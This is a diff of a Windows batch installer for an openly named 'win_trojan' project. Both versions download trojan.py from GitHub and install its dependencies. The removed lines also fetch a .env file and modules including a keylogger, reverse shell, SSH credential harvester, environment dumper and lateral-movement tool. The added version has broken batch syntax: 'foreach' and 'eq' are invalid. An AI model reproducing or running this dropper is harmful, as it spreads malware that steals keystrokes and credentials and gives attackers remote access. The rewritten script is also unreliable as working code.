@@ -1,71 +1,55 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Configuration
-set "REPO_URL=https://raw.githubusercontent.com/Noah-school/win_trojan/main"
-set "FILES=trojan.py requirements.txt .env"
-set "MODULES=discovery.py env_dump.py keylogger.py lateral.py port_scan.py rev_shell.py screenshot.py ssh_harvester.py system_enum.py"
+:: --- CONFIGURATION ---
+:: Replace these URLs with your actual raw file links
+set "BASE_URL=https://raw.githubusercontent.com/Noah-school/YOUR_REPO_NAME/main"
+set "FILES=requirements.txt env trojan.py"
+set "MODULES_FOLDER_URL=https://example.com/api/modules_zip_or_individual_files"
 
-echo ==========================================
-echo       win_trojan Installer / Setup
-echo ==========================================
+echo [+] Starting environment setup...
 
-:: 1. Check for Python
+:: 1. Check if Python is installed
 python --version >nul 2>&1
-if !errorlevel! neq 0 (
+if %errorlevel% neq 0 (
     echo [!] Python is not installed or not in PATH.
-    echo [!] Please install Python (and check "Add Python to PATH").
+    echo [!] Please install Python from https://www.python.org/
     pause
-    exit /b 1
+    exit /b
 )
+echo [+] Python detected.
 
-:: 2. Create directories
-echo [*] Creating directory structure...
-if not exist "modules" mkdir "modules"
-if not exist "config" mkdir "config"
-if not exist "data" mkdir "data"
-
-:: 3. Download main files
-echo [*] Downloading main files...
-for %%f in (%FILES%) do (
-    echo [*] Downloading %%f...
-    curl -s -f -O "!REPO_URL!/%%f"
-    if !errorlevel! neq 0 (
-        echo [!] Warning: Could not download %%f. 
-        echo     (Check connection or repository privacy)
+:: 2. Download individual files
+foreach %%f in (%FILES%) do (
+    echo [+] Downloading %%f...
+    curl -L -s -o "%%f" "%BASE_URL%/%%f"
+    if %errorlevel% neq 0 (
+        echo [!] Failed to download %%f
     )
 )
 
-:: 4. Download modules
-echo [*] Downloading modules...
-for %%m in (%MODULES%) do (
-    echo [*]   -^> %%m...
-    curl -s -f -o "modules/%%m" "!REPO_URL!/modules/%%m"
-    if !errorlevel! neq 0 (
-        echo [!] Warning: Could not download module %%m.
-    )
-)
+:: 3. Download Modules Folder
+:: Note: curl cannot download folders directly via HTTP. 
+:: This assumes you have a zip of the modules or creates the directory.
+if not exist "modules" mkdir modules
+echo [+] Downloading modules (Note: Ensure your URL points to a downloadable resource)...
+:: Example for a single file inside modules; repeat as needed or use a zip extraction method
+curl -L -s -o "modules/__init__.py" "%BASE_URL%/modules/__init__.py"
 
-:: 5. Install dependencies
-echo [*] Installing dependencies...
-python -m pip install --upgrade pip >nul
-
+:: 4. Install Requirements
 if exist "requirements.txt" (
-    echo [*] Installing from requirements.txt...
-    pip install -r requirements.txt
+    echo [+] Installing dependencies from requirements.txt...
+    python -m pip install --upgrade pip >nul
+    python -m pip install -r requirements.txt
+    if %errorlevel% eq 0 (
+        echo [+] Dependencies installed successfully.
+    ) else (
+        echo [!] Error occurred during pip installation.
+    )
 ) else (
-    echo [!] requirements.txt not found. Attempting manual installation of core modules...
-    pip install requests github3.py pynput psutil pycryptodome pyautogui scapy paramiko Pillow python-dotenv
+    echo [!] requirements.txt not found, skipping pip install.
 )
 
-if !errorlevel! neq 0 (
-    echo [!] Error occurred during dependency installation.
-) else (
-    echo.
-    echo ==========================================
-    echo [+] Setup Complete!
-    echo [+] Run 'python trojan.py' to start.
-    echo ==========================================
-)
-
+echo.
+echo [+] Setup complete. You can now run: python trojan.py
 pause
